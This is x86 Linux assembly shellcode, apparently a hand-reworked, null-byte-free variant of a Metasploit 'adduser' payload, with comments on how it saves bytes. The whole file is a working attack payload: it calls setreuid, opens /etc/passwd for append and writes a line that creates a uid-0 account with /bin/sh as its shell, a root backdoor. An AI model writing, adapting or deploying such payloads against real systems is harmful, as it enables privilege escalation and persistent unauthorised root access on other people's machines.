global _start

section .text
_start:
    ; xor ecx,ecx
    sub ecx, ecx
    
    ; mov ebx,ecx
    xor ebx, ebx

    push byte +0x46
    pop eax             ; 0x46 from stack
        ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 70$"
        ; setreuid()
        ; int setreuid(uid_t ruid, uid_t euid);
    int 0x80



    ; a successful setreuid() returns 0), thus, eax should be zero
    ; thus, we can just set the least significant byte to 0x5. This also reduces
    ; the number of bytes in the shellcode by 1.
    
    ; push byte +0x5
    ; pop eax             
    mov al, 0x5

    xor ecx,ecx
    push ecx
    push dword 0x64777373   ; (ascii) dwss
    push dword 0x61702f2f   ; (ascii) ap//
    push dword 0x6374652f   ; (ascii) cte/
    mov ebx,esp             ; /etc//passwd
    inc ecx                 ; ecx = 1
    mov ch,0x4              ; ecx = 0x401 (O_WRONLY|O_APPEND)
    int 0x80                ; open("/etc//passwd", 0x0401)



    ; xchg eax,ebx            ; ebx = ptr to file
    mov ebx, eax

    ; change to jmp, call, pop technique to remove NULLs
    ; call _label1
    ; db "username:AzydwfoigBTrs:0:0::/:/bin/sh", 0x0
    jmp _payload               ; call label1 


_label1:             
    pop ecx             ; ptr to 0x2b
    
    ; must replace this as the opcode offsets have changed with my modifications
    ; mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
    mov dl, 0x26
    

    ; Tried to incorporate same method of using opcodes as value. 
    ; mov into al since my 4 byte opcode has no nulls like the metasploit code did
    push byte +0x4      ;
    pop eax             ; write()
    ; mov al, [ecx-0xa]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
    
    int 0x80            ; ssize_t write(int fd, const void *buf, size_t count);



    ; since I am writing 38 bytes, 0x26 should be in eax as the return value
    ; from write(). Thus, I can just set the least significant byte to 0x1 and save a
    ; byte of shellcode
    ; push byte +0x1      
    ; pop eax
    mov al, 0x1
    

    int 0x80            ; exit()

_payload:
    call _label1
    db "username:AzydwfoigBTrs:0:0::/:/bin/sh", 0x0
